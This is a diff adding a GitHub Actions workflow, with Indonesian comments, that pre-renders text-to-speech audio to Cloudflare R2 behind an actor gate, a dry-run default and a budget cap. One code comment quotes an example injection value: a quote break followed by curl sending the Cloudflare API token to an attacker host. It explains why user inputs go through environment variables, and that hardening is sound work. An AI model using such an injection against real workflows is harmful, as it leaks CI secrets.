@@ -1,0 +1,133 @@
+# E5 — pra-render TTS korpus FIEZEL ke R2 lewat Workers AI (cf-b4 §3.2).
+#
+# Workflow ini menyalin SETIAP properti keamanan audio-generate.yml, bukan meniru sebagiannya:
+# hanya workflow_dispatch, apply bawaan kosong, concurrency, masukan pengguna lewat env, rahasia
+# hanya di langkah Produksi, dan audio-asset-pipeline-test.js dijalankan sebelum commit.
+#
+# SATU PROPERTI DITAMBAHKAN yang tidak ada di audio-generate.yml: gate aktor. cf-a2 mencatat
+# asimetri itu sebagai temuan — workflow Cloudflare yang sudah ada (deploy-core-worker.yml:17,
+# configure-core.yml:12) punya gate aktor, sedangkan workflow audio tidak. Jangan mewarisi yang
+# lebih lemah. Pra-render ini membelanjakan uang owner; satu-satunya orang yang boleh menekannya
+# adalah owner.
+#
+# Yang dilaporkan SEBELUM apply: jumlah kalimat, jumlah yang belum ada, karakter, dan biaya dolar.
+# Rencana berjalan tanpa satu rahasia pun dan tanpa satu permintaan jaringan pun.
+name: FIEZEL Audio Pre-render (Cloudflare)
+
+on:
+  workflow_dispatch:
+    inputs:
+      content:
+        description: 'Domain: all | listening | book | vocabulary'
+        required: true
+        default: 'all'
+      book_id:
+        description: 'Batasi ke satu buku (mis. the_little_prince) agar bisa bertahap'
+        required: false
+        default: ''
+      limit:
+        description: 'Jumlah aset maksimum sekali jalan (0 = seluruh domain, tunduk anggaran)'
+        required: false
+        default: '200'
+      budget_usd:
+        description: 'Anggaran dolar untuk sekali jalan. Jalan DITOLAK bila estimasi melampauinya.'
+        required: false
+        default: '1.00'
+      apply:
+        description: 'Ketik APPLY untuk benar-benar memproduksi. Selain itu tetap dry-run.'
+        required: false
+        default: ''
+
+permissions:
+  contents: write
+
+concurrency:
+  # Dua jalan bersamaan menghitung kunci yang sama, memproduksinya dua kali, lalu bertabrakan
+  # saat menulis manifest. Yang kedua bukan hanya sia-sia — ia berbayar.
+  group: fiezel-audio-prerender
+  cancel-in-progress: false
+
+jobs:
+  prerender:
+    # Gate aktor: bukan sekadar "hanya kolaborator". Repositori ini auto-deploy ke produksi tiap
+    # 5 menit dan workflow ini memegang token Cloudflare; siapa pun yang bisa menjalankannya bisa
+    # membelanjakan anggaran AI owner.
+    if: github.actor == 'FIEZEL-APPS'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      # Gerbang dijalankan LEBIH DULU. Kunci yang salah hitung berarti seluruh batch dianggap
+      # belum ada dan dibayar ulang; memeriksanya di sini berbiaya nol detik dibanding sembilan dolar.
+      - name: Gerbang kunci dan rencana
+        run: |
+          node tts-key-test.js
+          node prerender-dryrun-test.js
+
+      # Masukan pengguna TIDAK PERNAH ditanam langsung ke dalam run:. Ia lewat env, dibaca sebagai
+      # variabel shell yang dikutip. Langkah Produksi di bawah memegang CLOUDFLARE_API_TOKEN; satu
+      # dispatch dengan limit berisi
+      #   200'; curl -X POST https://penyerang/?k=$CLOUDFLARE_API_TOKEN #
+      # akan menutup kutipnya dan mengirim token itu keluar. Penyamaran log GitHub tidak
+      # menghentikan apa pun yang sudah terlanjur dikirim ke jaringan.
+      - name: Rencana (dry-run, nol jaringan, nol rahasia)
+        env:
+          CONTENT: ${{ inputs.content }}
+          BOOK_ID: ${{ inputs.book_id }}
+          LIMIT: ${{ inputs.limit }}
+        run: |
+          node tools/prerender-tts.mjs \
+            --content="$CONTENT" \
+            --book-id="$BOOK_ID" \
+            --limit="$LIMIT"
+
+      - name: Produksi
+        if: ${{ inputs.apply == 'APPLY' }}
+        env:
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
+          FIEZEL_AUDIO_BUCKET: ${{ vars.FIEZEL_AUDIO_BUCKET }}
+          FIEZEL_TTS_SPEAKER: ${{ vars.FIEZEL_TTS_SPEAKER }}
+          CONTENT: ${{ inputs.content }}
+          BOOK_ID: ${{ inputs.book_id }}
+          LIMIT: ${{ inputs.limit }}
+          BUDGET: ${{ inputs.budget_usd }}
+        run: |
+          node tools/prerender-tts.mjs \
+            --content="$CONTENT" \
+            --book-id="$BOOK_ID" \
+            --limit="$LIMIT" \
+            --budget-usd="$BUDGET" \
+            --apply
+
+      - name: Pemeriksaan rahasia sebelum commit
+        if: ${{ inputs.apply == 'APPLY' }}
+        run: node audio-asset-pipeline-test.js
+
+      # Yang di-commit hanya manifest. Binernya tinggal di R2 — Git bukan basis data media.
+      - name: Simpan manifest
+        if: ${{ inputs.apply == 'APPLY' }}
+        env:
+          CONTENT: ${{ inputs.content }}
+        run: |
+          if [ -z "$(git status --porcelain audio/manifest-tts-v2.json)" ]; then
+            echo 'Tidak ada aset baru.'
+            exit 0
+          fi
+          git config user.name 'fiezel-audio-bot'
+          git config user.email 'noreply@github.com'
+          git add audio/manifest-tts-v2.json
+          git commit -m "Audio: pra-render $CONTENT (Workers AI, kunci v2)"
+          # Push yang gagal terjadi SETELAH dolarnya terpakai, dan manifest yang tidak mendarat
+          # berarti seluruh batch diproduksi ulang pada jalan berikutnya. Karena itu diulang
+          # dengan rebase, bukan dibiarkan gagal sekali lalu menyerah.
+          for attempt in 1 2 3; do
+            if git push; then exit 0; fi
+            echo "Push gagal (percobaan $attempt); menarik perubahan lalu mencoba lagi."
+            git pull --rebase --autostash || true
+          done
+          echo 'Manifest tidak bisa didorong. Aset SUDAH ada di R2; jalankan ulang setelah konflik beres.' >&2
+          exit 1
